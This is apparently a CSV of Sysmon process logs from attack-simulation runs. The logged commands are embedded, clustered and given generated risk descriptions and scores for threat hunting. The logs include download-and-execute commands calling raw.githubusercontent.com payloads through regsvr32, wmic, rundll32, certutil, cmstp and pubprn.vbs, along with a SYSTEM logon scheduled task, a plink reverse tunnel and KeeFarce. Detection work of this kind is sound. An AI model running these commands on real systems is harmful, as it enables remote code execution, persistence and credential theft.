Timestamp,Computer,Provider,EventID,CommandLine,Embedding,Cluster_DBSCAN,Cluster_KMeans,DBSCANClusterDescription,DBSCANClusterRiskScore
2019-07-29T21:33:28.250664Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmd  /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll,"[-0.00158908  0.03596526 -0.00732026 ...  0.01382672  0.00218265
 -0.01916778]",55,48,"This cluster contains commands that invoke the .NET framework's `regsvcs.exe` to register a DLL file named `AllTheThings.dll`. These commands are executed through the command line interface and involve both the 32-bit and 64-bit versions of the .NET framework, indicating possible manipulation of .NET services.",7
2019-07-29T21:33:28.374373Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmd  /c C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe AllTheThings.dll,"[ 0.00943931  0.02915035 -0.0062667  ...  0.01262763  0.00119562
 -0.01523483]",55,48,"This cluster contains commands that invoke the .NET framework's `regsvcs.exe` to register a DLL file named `AllTheThings.dll`. These commands are executed through the command line interface and involve both the 32-bit and 64-bit versions of the .NET framework, indicating possible manipulation of .NET services.",7
2019-07-29T21:33:29.341503Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe  AllTheThings.dll,"[ 0.0026585   0.03182459 -0.01272365 ...  0.00585489  0.01187231
 -0.02594261]",55,48,"This cluster contains commands that invoke the .NET framework's `regsvcs.exe` to register a DLL file named `AllTheThings.dll`. These commands are executed through the command line interface and involve both the 32-bit and 64-bit versions of the .NET framework, indicating possible manipulation of .NET services.",7
2019-07-29T21:33:29.565736Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmd  /c C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regsvcs.exe AllTheThings.dll,"[ 0.00724664  0.03140343 -0.00725841 ...  0.01315146  0.00281901
 -0.01409309]",55,48,"This cluster contains commands that invoke the .NET framework's `regsvcs.exe` to register a DLL file named `AllTheThings.dll`. These commands are executed through the command line interface and involve both the 32-bit and 64-bit versions of the .NET framework, indicating possible manipulation of .NET services.",7
2019-07-29T21:33:29.646278Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmd  /c C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll,"[-0.00288609  0.03643762 -0.00775797 ...  0.01328586  0.00265757
 -0.01872313]",55,48,"This cluster contains commands that invoke the .NET framework's `regsvcs.exe` to register a DLL file named `AllTheThings.dll`. These commands are executed through the command line interface and involve both the 32-bit and 64-bit versions of the .NET framework, indicating possible manipulation of .NET services.",7
2019-07-29T21:33:34.295068Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmd  /c C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe /U AllTheThings.dll,"[-0.00125878  0.02692636 -0.00811819 ... -0.00214962  0.01485753
 -0.02040392]",56,5,"This cluster consists of multiple commands invoking the .NET Framework's regasm tool to unregister a DLL named 'AllTheThings.dll'. The use of regasm with the /U option indicates an intention to remove the registration of a COM assembly, which is unusual if the assembly is not known to be malicious. Given the nature of such commands, they may indicate an attempt to disable or remove functionality related to potentially harmful software.",7
2019-07-29T21:33:34.411034Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmd  /c C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe /U AllTheThings.dll,"[-0.00329679  0.02836976 -0.00782721 ... -0.0029062   0.0160102
 -0.02001661]",56,5,"This cluster consists of multiple commands invoking the .NET Framework's regasm tool to unregister a DLL named 'AllTheThings.dll'. The use of regasm with the /U option indicates an intention to remove the registration of a COM assembly, which is unusual if the assembly is not known to be malicious. Given the nature of such commands, they may indicate an attempt to disable or remove functionality related to potentially harmful software.",7
2019-07-29T21:33:39.312305Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmd  /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThings.dll,"[-0.01083603  0.03215358 -0.00910196 ... -0.0009812   0.01549877
 -0.0206085 ]",56,5,"This cluster consists of multiple commands invoking the .NET Framework's regasm tool to unregister a DLL named 'AllTheThings.dll'. The use of regasm with the /U option indicates an intention to remove the registration of a COM assembly, which is unusual if the assembly is not known to be malicious. Given the nature of such commands, they may indicate an attempt to disable or remove functionality related to potentially harmful software.",7
2019-07-29T21:33:39.358048Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmd  /c C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll,"[-0.0119964   0.0316822  -0.00809006 ... -0.00240583  0.01555602
 -0.02126529]",56,5,"This cluster consists of multiple commands invoking the .NET Framework's regasm tool to unregister a DLL named 'AllTheThings.dll'. The use of regasm with the /U option indicates an intention to remove the registration of a COM assembly, which is unusual if the assembly is not known to be malicious. Given the nature of such commands, they may indicate an attempt to disable or remove functionality related to potentially harmful software.",7
2019-07-29T21:33:39.907321Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe  /U AllTheThings.dll,"[-0.00269248  0.0306748  -0.01046931 ... -0.01152504  0.01932571
 -0.02910586]",56,5,"This cluster consists of multiple commands invoking the .NET Framework's regasm tool to unregister a DLL named 'AllTheThings.dll'. The use of regasm with the /U option indicates an intention to remove the registration of a COM assembly, which is unusual if the assembly is not known to be malicious. Given the nature of such commands, they may indicate an attempt to disable or remove functionality related to potentially harmful software.",7
2019-07-29T21:33:44.268287Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmd  /c regsvr32.exe /s /u /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp_calc.sct scrobj.dll,"[-0.01782564 -0.01418743 -0.00696662 ... -0.01722192  0.01012026
  0.00661312]",57,34,This cluster comprises commands that utilize 'regsvr32.exe' to unregister a DLL while invoking a script from the internet. The use of remote scripts suggests potentially malicious activity.,9
2019-07-29T21:33:44.641177Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp_calc.sct scrobj.dll,"[ 3.04101213e-05 -4.32847068e-03 -1.42561914e-02 ... -2.21467540e-02
  1.08074909e-02  2.14272970e-03]",57,34,This cluster comprises commands that utilize 'regsvr32.exe' to unregister a DLL while invoking a script from the internet. The use of remote scripts suggests potentially malicious activity.,9
2019-07-29T21:33:49.748805Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmd  /c C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe xxxFile.csproj,"[-0.00424346  0.01239963  0.00553128 ...  0.01332151  0.00830395
 -0.01579159]",58,92,"Commands related to the execution of MSBuild, a build tool for .NET applications, indicating potential development or deployment activity.",4
2019-07-29T21:33:50.104868Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe  xxxFile.csproj,"[ 0.00598566  0.01536195  0.00281994 ...  0.00938637  0.01961872
 -0.02194181]",58,92,"Commands related to the execution of MSBuild, a build tool for .NET applications, indicating potential development or deployment activity.",4
2019-07-29T21:33:53.776441Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"cmd  /c wmic process get brief /format:""https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Wmic_calc.xsl""","[-2.68968730e-03 -2.46901072e-06 -6.14952343e-03 ... -6.60072174e-03
 -2.20464896e-02 -1.37401593e-03]",59,33,"Commands utilizing WMIC to retrieve processes formatted as an external resource, potentially linked to remote payloads.",8
2019-07-29T21:33:54.246154Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"wmic  process get brief /format:""https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Wmic_calc.xsl""","[ 1.40670845e-02  1.19223278e-02 -8.50017834e-03 ... -8.71307682e-03
 -1.77888703e-02 -1.35294786e-05]",59,33,"Commands utilizing WMIC to retrieve processes formatted as an external resource, potentially linked to remote payloads.",8
2019-07-29T21:33:58.256845Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmd  /c netsh trace start capture=yes filemode=append persistent=yes tracefile=trace.etl    ,"[-0.01380548  0.01319931  0.00087184 ...  0.01302504  0.00250423
 -0.03364234]",60,25,"This cluster involves commands related to network tracing using 'netsh', indicating monitoring or capturing of network activity, which could be utilized for troubleshooting or malicious purposes.",4
2019-07-29T21:33:58.286383Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmd  /c netsh trace show status    ,"[-2.43220646e-02  1.49788326e-02  6.32151263e-03 ...  8.02934010e-05
  1.18829601e-03 -4.98305727e-03]",61,25,"Commands related to network tracing status, generally used for monitoring and diagnostics without malicious intent.",3
2019-07-29T21:33:58.485479Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmd  /c netsh.exe add helper AllTheThings.dll,"[-0.00634436  0.00129219  0.00249717 ...  0.00376377 -0.00549112
 -0.02739491]",62,44,"Commands related to adding a network helper DLL using netsh, which could indicate potential misuse or malicious intent if the DLL is not legitimate.",7
2019-07-29T21:33:58.543692Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmd  /c netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8000 connectaddress=192.168.1.1,"[-0.02104344 -0.01078084 -0.00142091 ...  0.0109786  -0.00098279
 -0.02089343]",63,23,"Commands related to configuring port forwarding using netsh, allowing external access to internal services.",7
2019-07-29T21:33:58.598592Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmd  /c netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0,"[-0.0522557  -0.03463555  0.00801978 ...  0.01219804 -0.01175822
 -0.01663056]",64,23,"This cluster contains commands that manipulate network port proxy settings using netsh, specifically deleting a port forwarding rule.",4
2019-07-29T21:33:58.683059Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmd  /c netsh trace stop,"[-0.02939706  0.00351388  0.01227777 ... -0.00054845 -0.00304675
 -0.02154473]",65,25,"This cluster involves stopping network traces, which could indicate the end of a monitoring session and potentially point to attempts to hide previous network activity.",4
2019-07-29T21:34:00.330766Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,netsh  trace show status    ,"[ 0.00934442  0.02133899  0.0005802  ...  0.00106944  0.0025027
 -0.00738746]",61,25,"Commands related to network tracing status, generally used for monitoring and diagnostics without malicious intent.",3
2019-07-29T21:34:00.420234Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,netsh  trace start capture=yes filemode=append persistent=yes tracefile=trace.etl    ,"[ 0.00810906  0.01129862 -0.0046685  ...  0.00850292  0.00500831
 -0.03140135]",60,25,"This cluster involves commands related to network tracing using 'netsh', indicating monitoring or capturing of network activity, which could be utilized for troubleshooting or malicious purposes.",4
2019-07-29T21:34:00.434980Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,netsh  trace stop,"[-0.00779038  0.00981678  0.01074743 ... -0.00311278 -0.00634939
 -0.02673347]",65,25,"This cluster involves stopping network traces, which could indicate the end of a monitoring session and potentially point to attempts to hide previous network activity.",4
2019-07-29T21:34:00.442242Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,netsh  interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0,"[-0.02821989 -0.04316718  0.00064168 ...  0.00779234 -0.00216523
 -0.0209587 ]",64,23,"This cluster contains commands that manipulate network port proxy settings using netsh, specifically deleting a port forwarding rule.",4
2019-07-29T21:34:00.460197Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,netsh  interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8000 connectaddress=192.168.1.1,"[-0.00112414 -0.01274727 -0.00385054 ...  0.00791321  0.01013096
 -0.02247325]",63,23,"Commands related to configuring port forwarding using netsh, allowing external access to internal services.",7
2019-07-29T21:34:00.466817Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,netsh.exe  add helper AllTheThings.dll,"[ 0.00490989  0.00941971 -0.00541906 ... -0.00079286 -0.00648469
 -0.0345947 ]",62,44,"Commands related to adding a network helper DLL using netsh, which could indicate potential misuse or malicious intent if the DLL is not legitimate.",7
2019-07-29T21:34:01.090445Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\dispdiag.exe -out dispdiag_start.dat,"[ 0.00870318  0.00377724 -0.00138349 ...  0.00541049  0.00092747
 -0.02988866]",-1,139,Unclustered commands,0
2019-07-29T21:34:05.237600Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"cmd  /c rundll32 AllTheThings.dll,EntryPoint","[-0.00090818 -0.00709531  0.0012645  ...  0.00030679  0.0089293
 -0.03428986]",66,44,"Commands utilizing rundll32 to execute code from a potentially suspicious DLL, indicating a high risk of malicious activity.",8
2019-07-29T21:34:05.502592Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"rundll32  AllTheThings.dll,EntryPoint","[ 0.01931233 -0.00388998 -0.0075715  ... -0.00983127  0.0126414
 -0.0346888 ]",66,44,"Commands utilizing rundll32 to execute code from a potentially suspicious DLL, indicating a high risk of malicious activity.",8
2019-07-29T21:34:10.373481Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"cmd  /c rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test"")","[-0.05007757 -0.02626261 -0.00773573 ... -0.01020405 -0.00450252
 -0.02889217]",67,60,"This cluster contains commands that utilize rundll32.exe to execute a JavaScript payload. The commands are attempting to fetch and execute a script from an external URL, which poses a high security risk as it may lead to the execution of malicious code.",9
2019-07-29T21:34:10.708142Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"rundll32.exe  javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test"")","[-0.02602512 -0.02929862 -0.00874561 ... -0.01344414 -0.00153191
 -0.03260469]",67,60,"This cluster contains commands that utilize rundll32.exe to execute a JavaScript payload. The commands are attempting to fetch and execute a script from an external URL, which poses a high security risk as it may lead to the execution of malicious code.",9
2019-07-29T21:34:15.226408Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"cmd  /c rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();h=new0ActiveXObject(""WScript.Shell"").run(""calc.exe"",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new0ActiveXObject(""WScript.Shell"").Run(""cmd /c taskkill /f /im rundll32.exe && exit"",0,true);}","[-0.0170522  -0.01960023 -0.00810394 ... -0.00243872 -0.00462867
 -0.02647539]",68,60,"This cluster consists of commands invoking rundll32.exe to execute JavaScript payloads through a Windows HTML application, potentially allowing remote code execution. The commands involve executing calc.exe and attempting to terminate the rundll32.exe process afterwards, indicative of evasion or malicious activity.",9
2019-07-29T21:34:15.658168Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"rundll32.exe  javascript:""\..\mshtml,RunHTMLApplication "";document.write();h=new0ActiveXObject(""WScript.Shell"").run(""calc.exe"",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new0ActiveXObject(""WScript.Shell"").Run(""cmd /c taskkill /f /im rundll32.exe && exit"",0,true);}","[ 2.14981446e-05 -2.28321906e-02 -9.81709827e-03 ... -8.07679445e-03
 -3.15894885e-03 -3.00760195e-02]",68,60,"This cluster consists of commands invoking rundll32.exe to execute JavaScript payloads through a Windows HTML application, potentially allowing remote code execution. The commands involve executing calc.exe and attempting to terminate the rundll32.exe process afterwards, indicative of evasion or malicious activity.",9
2019-07-29T21:34:20.238305Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmd  /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt Default_File_Path2.ps1  ,"[-0.0242143   0.01052727 -0.00321534 ... -0.00577571 -0.03189936
 -0.00306251]",69,37,"Commands that utilize certutil to download a script from a potentially malicious source on the internet, indicative of potential malware delivery or exploitation attempts.",9
2019-07-29T21:34:20.459065Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,certutil.exe  -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt Default_File_Path2.ps1  ,"[-0.02643441  0.00974475 -0.00684823 ... -0.00817247 -0.03400151
 -0.00961863]",69,37,"Commands that utilize certutil to download a script from a potentially malicious source on the internet, indicative of potential malware delivery or exploitation attempts.",9
2019-07-29T21:34:25.202954Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmd  /c cmstp.exe /ni /s https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp.inf,"[-0.02741006  0.0078731   0.00082356 ... -0.01369715 -0.00242143
 -0.00368239]",70,123,"This cluster includes commands that leverage 'cmstp.exe' to execute scripts from an external URL, which suggests potential malicious intent, particularly in the context of evading detection by using legitimate Windows utilities.",8
2019-07-29T21:34:25.659355Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmstp.exe  /ni /s https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp.inf,"[-0.01284154  0.00443877 -0.00341763 ... -0.01737828  0.0043408
 -0.00739669]",70,123,"This cluster includes commands that leverage 'cmstp.exe' to execute scripts from an external URL, which suggests potential malicious intent, particularly in the context of evading detection by using legitimate Windows utilities.",8
2019-07-29T21:34:30.237042Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmd  /c forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe,"[-0.01321267 -0.02470568 -0.00669232 ...  0.00120376 -0.02762909
 -0.02649699]",45,97,"This cluster consists of commands that utilize the 'forfiles' utility in conjunction with 'cmd.exe' to execute 'calc.exe' when 'notepad.exe' is present in the 'C:\Windows\System32\' directory. While the commands appear benign and are primarily command-line manipulations, their execution context and potential use in abuse cases warrant scrutiny.",4
2019-07-29T21:34:35.313087Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmd  /c winrm qc -q ,"[-0.02127349  0.03304243  0.00247483 ... -0.01039839  0.00578392
  0.00648037]",175,80,"This cluster contains commands related to the Windows Remote Management (WinRM) configuration, which allows for remote management of systems. The commands indicate an attempt to configure WinRM quietly, possibly for remote administration or automation purposes.",4
2019-07-29T21:34:35.337716Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"cmd  /c winrm i c wmicimv2/Win32_Process @{CommandLine=""calc""}","[-0.01771162 -0.0133229  -0.00046131 ... -0.00012123 -0.01242521
 -0.0124822 ]",71,80,Commands related to executing the Windows Calculator application ('calc') using Windows Remote Management (WinRM) and Windows Management Instrumentation (WMI).,3
2019-07-29T21:34:35.838188Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"cscript  //nologo ""C:\Windows\System32\winrm.vbs"" qc -q","[-0.00178316  0.01233216 -0.00625777 ... -0.01572465  0.00458827
 -0.0028882 ]",175,80,"This cluster contains commands related to the Windows Remote Management (WinRM) configuration, which allows for remote management of systems. The commands indicate an attempt to configure WinRM quietly, possibly for remote administration or automation purposes.",4
2019-07-29T21:34:35.878709Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"cscript  //nologo ""C:\Windows\System32\winrm.vbs"" i c wmicimv2/Win32_Process @{CommandLine=""calc""}","[ 0.00137845 -0.01927547 -0.00529619 ... -0.00866203 -0.0098413
 -0.01740829]",71,80,Commands related to executing the Windows Calculator application ('calc') using Windows Remote Management (WinRM) and Windows Management Instrumentation (WMI).,3
2019-07-29T21:34:36.534474Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,calc,"[-0.01080283  0.00494995 -0.02149279 ...  0.01480149 -0.01466443
  0.00379107]",-1,140,Unclustered commands,0
2019-07-29T21:34:40.261289Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"cmd  /c schtasks /create /tn ""mysc"" /tr C:\windows\system32\calc.exe /sc ONLOGON /ru ""System"" /f","[ 0.0090087   0.00139575  0.00217839 ...  0.01741308  0.0013044
 -0.02519907]",72,68,"Commands creating a scheduled task to run calc.exe on logon, indicating potential misuse of system resources.",6
2019-07-29T21:34:40.889027Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"schtasks  /create /tn ""mysc"" /tr C:\windows\system32\calc.exe /sc ONLOGON /ru ""System"" /f","[ 0.02221146 -0.007794   -0.002871   ...  0.01262599  0.00147833
 -0.02620839]",72,68,"Commands creating a scheduled task to run calc.exe on logon, indicating potential misuse of system resources.",6
2019-07-29T21:34:45.242404Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmd  /c cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct,"[-0.00977893  0.00087897 -0.00908434 ... -0.01670144 -0.01854329
 -0.00428072]",14,22,"This cluster contains multiple executions of the `cscript.exe` command using the VBScript located in the Printing Admin Scripts folder. The scripts are pulling scripts from external URLs, indicating possible malicious activity, especially since they use localhost and include remote payloads.",8
2019-07-29T21:34:45.606737Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cscript  /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct,"[ 0.00438449  0.00119157 -0.00999696 ... -0.02290643 -0.02141082
 -0.00768271]",14,22,"This cluster contains multiple executions of the `cscript.exe` command using the VBScript located in the Printing Admin Scripts folder. The scripts are pulling scripts from external URLs, indicating possible malicious activity, especially since they use localhost and include remote payloads.",8
2019-02-16T10:02:21.934438Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,plink.exe  10.0.2.18 -P 80 -C -R 127.0.0.3:4444:127.0.0.2:3389 -l test -pw test,"[-0.03623174  0.02000117 -0.00884531 ... -0.00988718  0.00492587
  0.00615202]",-1,67,Unclustered commands,0
2019-02-16T10:03:48.058278Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,UI0Detect.exe 224,"[ 0.00798834 -0.01224219  0.00352633 ... -0.01461644 -0.01075829
 -0.02489658]",73,69,"Commands associated with 'UI0Detect.exe', a system-level process that detects user input. Usage is limited and may indicate attempts to manipulate user interface settings or behavior.",4
2019-02-16T10:04:04.141404Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,\SystemRoot\System32\smss.exe 00000000 0000003c ,"[ 0.05377327 -0.01871766 -0.00333648 ...  0.00503429  0.00729919
  0.00660685]",74,20,"Commands executed involve multiple instances of the Session Manager Subsystem (smss.exe) with various parameters, indicating potential manipulation or monitoring of system sessions.",6
2019-02-16T10:04:04.151419Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,"%%SystemRoot%%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16","[ 0.04908386 -0.00925388 -0.00447684 ...  0.02467702 -0.00166615
  0.00254988]",75,118,"This cluster contains commands that reference the Client/Server Runtime Subsystem (csrss.exe), a critical Windows component responsible for handling system-level operations and user sessions. The slight variations in parameters indicate potentially normal operating behavior, though it's essential to ensure these commands originate from trusted sources and haven't been tampered with.",3
2019-02-16T10:04:04.221520Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,winlogon.exe,"[ 0.00166289 -0.02799597  0.0027332  ...  0.01669258  0.00081793
 -0.01991991]",222,96,"This cluster consists of commands related to system initialization and user logon processes. Both commands are essential components of the Windows operating system, handling critical tasks such as logging users in and initializing system processes.",2
2019-02-16T10:04:04.351707Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,"""LogonUI.exe"" /flags:0x0","[-0.01502149 -0.0137697   0.00972105 ...  0.00885552  0.02623753
 -0.01699574]",76,24,"This cluster consists of commands related to LogonUI.exe, which is the executable responsible for the logon screen in Windows. The varying flags and states suggest different parameters for the logon interface, typically used in the context of handling user authentication and display state during logon processes.",2
2019-02-16T10:04:05.563449Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,C:\Windows\system32\TSTheme.exe -Embedding,"[ 1.08094960e-02 -2.84577145e-05 -1.04468148e-02 ... -4.57688747e-03
  9.58741643e-03 -1.16294725e-02]",-1,77,Unclustered commands,0
2019-02-16T10:05:26.499830Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,atbroker.exe,"[ 0.00623927 -0.04350998 -0.0019983  ...  0.00608641 -0.01084531
 -0.01985626]",-1,96,Unclustered commands,0
2019-02-16T10:06:38.843856Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,taskhost.exe $(Arg0),"[ 0.01365592  0.007688   -0.00458812 ...  0.0111805   0.00456568
 -0.01041021]",77,121,Commands related to task hosting processes indicating possible malicious use.,6
2019-04-18T16:55:37.125139Z,IEWIN7,Microsoft-Windows-Sysmon,1,C:\Windows\Sysmon.exe,"[ 1.49266431e-02 -1.78404320e-02 -8.03434232e-05 ...  5.46987355e-03
 -5.93563216e-03 -3.75289954e-02]",-1,65,Unclustered commands,0
2019-04-18T16:55:37.125139Z,IEWIN7,Microsoft-Windows-Sysmon,1,C:\Windows\system32\wbem\unsecapp.exe -Embedding,"[ 0.01936181 -0.00552409 -0.01255688 ... -0.00919371 -0.01040383
 -0.01967612]",176,43,"The commands executed are related to Windows Management Instrumentation (WMI) processes, specifically unsecapp.exe and wmiprvse.exe, which are associated with running WMI provider processes. These commands seem to invoke these processes in a manner typical for legitimate administrative tasks, possibly for management and monitoring purposes.",3
2019-04-18T16:55:44.045089Z,IEWIN7,Microsoft-Windows-Sysmon,1,sysmon  -c sysmonconfig-18-apr-2019.xml,"[ 0.02078597  0.05492588  0.00281107 ...  0.01838759  0.01160698
 -0.00899393]",-1,112,Unclustered commands,0
2019-04-18T16:56:08.370067Z,IEWIN7,Microsoft-Windows-Sysmon,1,Powershell,"[-0.02102795  0.01053061 -0.00436696 ... -0.01903162 -0.00039043
 -0.00561466]",2,110,"Commands related to executing PowerShell, a powerful scripting language commonly used for automation and administrative tasks on Windows systems.",6
2019-04-18T16:56:24.893827Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\whoami.exe""  /user","[-0.00062232  0.00266759  0.00694509 ...  0.0081153   0.00311248
 -0.01376553]",47,31,"This cluster contains commands that execute the `whoami.exe` utility, primarily used for identifying the currently logged-in user and obtaining user information. The commands show little variation, mostly pertaining to user identification, with a repeated structure.",2
2019-04-18T16:57:04.681038Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" ","[ 0.02137135  0.02937266 -0.01952261 ... -0.01354012  0.02638511
 -0.01993673]",78,70,"This cluster pertains to the execution of the Microsoft Management Console (MMC) with the Event Viewer (eventvwr.msc) snap-in, indicating potential monitoring activities.",2
2019-04-27T18:47:00.046849Z,IEWIN7,Microsoft-Windows-Sysmon,1,KeeFarce.exe,"[-0.03328564 -0.02576896 -0.01826996 ... -0.01493609 -0.00167578
 -0.01825227]",-1,72,Unclustered commands,0
